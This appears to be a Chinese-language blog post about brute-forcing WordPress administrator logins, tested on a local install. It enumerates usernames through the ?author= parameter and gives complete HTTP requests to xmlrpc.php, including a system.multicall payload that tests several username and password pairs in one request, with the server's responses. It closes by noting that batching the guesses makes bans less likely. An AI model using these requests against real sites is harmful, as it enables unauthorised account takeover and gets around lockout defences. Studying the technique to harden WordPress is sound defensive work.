---
layout: post
title: "Wordpress 後台爆破"
description: ""
date: 2023-07-11
categories:
  - CVE
  - WordPress
author: ""
tags: ['CVE', 'WordPress', 'BruteForce']
---



# Wordpress 後台爆破

###### tags: `wordpress`



後台用戶探測:
http://localhost/?author=1
```
<link rel="alternate" type="application/rss+xml" title="留沙博客 » 由admin发表的文章Feed" href="http://localhost/author/admin/feed/">
```


http://localhost/?author=2
```
<link rel="alternate" type="application/rss+xml" title="留沙博客 » 由test1, test1发表的文章Feed" href="http://localhost/author/test1/feed/">
```

http://localhost/?author=3
```
<link rel="alternate" type="application/rss+xml" title="留沙博客 » 由test2, test2发表的文章Feed" href="http://localhost/author/test2/feed/">
```


http://localhost/?author=4
page not found 




### 到這邊為止我們探測出3個用戶
admin
test1
test2


<br/>
<br/>


# 利用xmlrpc.php對WordPress進行暴力破解攻擊


詳細說明:
https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=122495

https://wooyun.js.org/drops/WordPress%20%E5%88%A9%E7%94%A8%20XMLRPC%20%E9%AB%98%E6%95%88%E7%88%86%E7%A0%B4%20%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90.html









POST payload:
```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>admin</value></param>
  </params>
</methodCall>

```


bp:
```http=
POST /xmlrpc.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: NpHtD_admin_username=5ff7iIi-qmkChcz4NUr-kAi4nK3Gaf-9sUzunOpdPywIcQ; NpHtD_siteid=5ff7iIi-qmkChcz4NR_5kwG7kq3ENars4k-8zb0N; NpHtD_userid=d404pX26NdX1MOvSkXSZBq25rNZbU8jE1CR_2MsR; NpHtD_admin_email=6b11eaWkej43f_CT9zl4bs_woPde_o10IQal8a90uQ14uAi5ENu_Tg; NpHtD_sys_lang=6b11eaWkej43f_CT928sa837o_VZ8dlycVTyovg_4xNb5w; wp-settings-1=libraryContent%3Dbrowse%26mfold%3Do%26editor%3Dtinymce; wp-settings-time-1=1678692933
Upgrade-Insecure-Requests: 1
Content-Length: 224

<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>admin</value></param>
  </params>
</methodCall>


```
response:
成功出現:isAdmin 
```http=
HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 04:35:58 GMT
Server: Apache/2.2.31 (Win32) DAV/2 mod_ssl/2.2.31 OpenSSL/1.0.2h mod_fcgid/2.3.9 mod_wsgi/3.4 Python/2.7.6 PHP/7.4.1 mod_perl/2.0.8 Perl/v5.16.3
X-Powered-By: PHP/7.4.1
Connection: close
Vary: Accept-Encoding
Content-Length: 638
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://localhost/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>留沙博客</string></value></member>
  <member><name>xmlrpc</name><value><string>http://localhost/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

```
失敗:
403
```http=
HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 04:40:00 GMT
Server: Apache/2.2.31 (Win32) DAV/2 mod_ssl/2.2.31 OpenSSL/1.0.2h mod_fcgid/2.3.9 mod_wsgi/3.4 Python/2.7.6 PHP/7.4.1 mod_perl/2.0.8 Perl/v5.16.3
X-Powered-By: PHP/7.4.1
Connection: close
Vary: Accept-Encoding
Content-Length: 402
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>用户名或密码不正确。</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>

```
---

一次發多個 數據包
```http=
POST /xmlrpc.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: NpHtD_admin_username=5ff7iIi-qmkChcz4NUr-kAi4nK3Gaf-9sUzunOpdPywIcQ; NpHtD_siteid=5ff7iIi-qmkChcz4NR_5kwG7kq3ENars4k-8zb0N; NpHtD_userid=d404pX26NdX1MOvSkXSZBq25rNZbU8jE1CR_2MsR; NpHtD_admin_email=6b11eaWkej43f_CT9zl4bs_woPde_o10IQal8a90uQ14uAi5ENu_Tg; NpHtD_sys_lang=6b11eaWkej43f_CT928sa837o_VZ8dlycVTyovg_4xNb5w; wp-settings-1=libraryContent%3Dbrowse%26mfold%3Do%26editor%3Dtinymce; wp-settings-time-1=1678692933
Upgrade-Insecure-Requests: 1
Content-Length: 894

<methodCall>
  <methodName>system.multicall</methodName>
  <params><param>
    <value><array><data>
      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>admin</string></value>
          <value><string>admin</string></value>
        </data></array></value></member>
      </struct></value>

      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>guest</string></value>
          <value><string>test</string></value>
        </data></array></value></member>
      </struct></value>
    </data></array></value>
  </param></params>
</methodCall>
```

返回 
一個isadmin
一個403

```http=
HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 04:48:31 GMT
Server: Apache/2.2.31 (Win32) DAV/2 mod_ssl/2.2.31 OpenSSL/1.0.2h mod_fcgid/2.3.9 mod_wsgi/3.4 Python/2.7.6 PHP/7.4.1 mod_perl/2.0.8 Perl/v5.16.3
X-Powered-By: PHP/7.4.1
Connection: close
Vary: Accept-Encoding
Content-Length: 945
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><array><data>
  <value><array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://localhost/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>留沙博客</string></value></member>
  <member><name>xmlrpc</name><value><string>http://localhost/xmlrpc.php</string></value></member>
</struct></value>
</data></array></value>
</data></array></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>用户名或密码不正确。</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```



### 這種利用，可以提高暴破效率，而且多個數據一次返回，不容易被ban。